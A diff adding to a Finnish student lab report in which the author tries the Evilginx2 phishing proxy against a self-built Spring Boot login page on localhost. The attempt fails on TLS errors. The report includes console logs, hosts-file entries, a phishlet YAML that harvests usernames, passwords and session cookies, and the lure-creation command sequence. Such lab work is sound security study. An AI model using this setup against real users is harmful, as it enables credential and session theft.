@@ -232,12 +232,153 @@ sudo apt-get install evilginx2
 
 - Mitä teit työkalun kanssa?
 
+Katsoin ensin Clint & Si:n videon [^20], jossa demonstroidaan työkalun käyttöä. Aika hurja. 
 
+Halusin kokeilla voinko huijata itseltäni crendentiaalit ja tein Spring Boot sovelluksen, jossa on kirjautuminen. 
 
+Voi olla, että ehkä pääsin aika lähelle.   
+
+Ensimmäinen kokeilulla millä sain phishing osoitteen, joka ei kuitenkaan toiminut. Komennot videolta [^20].
+
+```bash
+[20:45:08] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)                                                                                             
+[20:45:08] [inf] loading phishlets from: /usr/share/evilginx2/phishlets/
+[20:45:08] [inf] loading configuration from: /home/parallels/.evilginx
+[20:45:08] [inf] blacklist: loaded 0 ip addresses and 0 ip masks
+[20:45:08] [war] phishlets: hostname 'academy.breakdev.org' collision between 'spring' and 'example' phishlets
+
++-----------+-----------+-------------+-----------+-------------+
+| phishlet  |  status   | visibility  | hostname  | unauth_url  |                                         
++-----------+-----------+-------------+-----------+-------------+                                         
+| example   | disabled  | visible     |           |             |                                         
+| spring    | disabled  | visible     |           |             |                                         
++-----------+-----------+-------------+-----------+-------------+                                         
+
+: config domain breakdev.org
+[20:45:40] [inf] server domain set to: breakdev.org
+: config ipv4 127.0.0.1
+[20:45:51] [inf] server external IP set to: 127.0.0.1
+: phishlets hostname spring academy.breakdev.org
+[20:46:06] [inf] phishlet 'spring' hostname set to: academy.breakdev.org
+[20:46:06] [inf] disabled phishlet 'spring'
+: phishlets enable spring
+[20:46:47] [war] phishlets: hostname 'academy.breakdev.org' collision between 'spring' and 'example' phishlets
+[20:46:47] [inf] enabled phishlet 'spring'
+: phishlets get-url spring
+[20:47:47] [err] phishlets: invalid syntax: [get-url spring]
+: lures create spring
+[20:48:09] [inf] created lure with ID: 0
+: lures get-url 0
+
+https://academy.academy.breakdev.org/WWWKtTHt
+
+```
+
+Tässä oli ehkä enemmän järkeä, mutta en ole ole kyllä varma. Lopussa oleva error ilmoitus käy kyllä järkeen (ehkä Evilginx tarvitsee toimiakseen https yhteydellä olevan sivun).  
+
+```bash
+[21:23:03] [inf] Evilginx Mastery Course: https://academy.breakdev.org/evilginx-mastery (learn how to create phishlets)                                                                                             
+[21:23:03] [inf] loading phishlets from: /usr/share/evilginx2/phishlets/
+[21:23:03] [inf] loading configuration from: /home/parallels/.evilginx
+[21:23:04] [inf] blacklist: loaded 0 ip addresses and 0 ip masks
+
++-----------+-----------+-------------+-----------+-------------+
+| phishlet  |  status   | visibility  | hostname  | unauth_url  |                                         
++-----------+-----------+-------------+-----------+-------------+                                         
+| spring    | disabled  | visible     |           |             |                                         
++-----------+-----------+-------------+-----------+-------------+                                         
+
+: config domain security-update.com
+[21:23:38] [inf] server domain set to: security-update.com
+: config ipv4 127.0.0.1
+[21:23:49] [inf] server external IP set to: 127.0.0.1
+: phishlets hostname spring security-update.com
+[21:24:47] [inf] phishlet 'spring' hostname set to: security-update.com
+[21:24:47] [inf] disabled phishlet 'spring'
+: phishlets enable spring
+[21:25:07] [inf] enabled phishlet 'spring'
+: lures create spring
+[21:25:26] [inf] created lure with ID: 3
+: lures get-url 3
+
+https://academy.security-update.com/RnXXpBCk
+
+[21:27:53] [err] http_proxy: failed to get TLS certificate for: academy.breakdev.org:443 error: EOF
+[21:27:53] [err] http_proxy: failed to get TLS certificate for: academy.breakdev.org:443 error: EOF
+: 2025/05/06 21:27:53 [001] WARN: Error responding to client: write tcp 127.0.0.1:443->127.0.0.1:33042: i/o timeout
+2025/05/06 21:27:53 [002] WARN: Error responding to client: write tcp 127.0.0.1:443->127.0.0.1:33058: i/o timeout
+```
+
+/etc/hosts lisäykset:
+
+```bash
+127.0.0.1   academy.breakdev.org
+127.0.0.1  breakdev.org
+127.0.0.1  academy.academy.breakdev.org
+
+127.0.0.1 security-update.com academy.security-update.com
+```
+
+Phislet, jota käytin (kohdat: custom_ip: '127.0.0.1', custom_port: 8080, custom_protocol: 'http' on ChatGPT [^21] tarjoamia (varmanaankin sekoilua, paitsi, että custom_ip ehkä toimi 🤔) ):
+
+```yaml
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true, custom_ip: '127.0.0.1', custom_port: 8080, custom_protocol: 'http'}
+
+auth_tokens:
+  - domain: '.academy.breakdev.org'
+    keys: ['JSESSIONID']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'academy.breakdev.org'
+  path: '/login'
+```
+
+Ehkä toimivat Evilginx komennot olivat siis:
+
+```
+config domain security-update.com
+```
+
+```
+config ipv4 127.0.0.1
+```
+
+```
+phishlets hostname spring security-update.com
+```
+
+```
+phishlets enable spring
+```
+
+```
+lures create spring
+```
+
+```
+lures get-url <number> 
+```
+
+Valitettavasti pitää ajanpuutteen vuoksi siirtyä eteenpäinä, mutta pitää koittaa niin, että tekee seuraavaksi selfsignatulla certillä.
 
 - Onnistuitko huijaamaan liikennettä
 
+En valitettavasti. 
 
+---
 
 
 
@@ -283,3 +424,6 @@ sudo apt-get install evilginx2
 
 [^19]: kgretzky. Evilginx 3.0: https://github.com/kgretzky/evilginx2
 
+[^20]: Clint & Si. GitHub Phishing Attack: Evilginx2 MFA Bypass Explained | 2024: https://www.youtube.com/watch?v=e7SebbYUS2w
+
+[^21]: OpenAI. ChatGPT: Version 1.2025.112, Model GPT‑4o
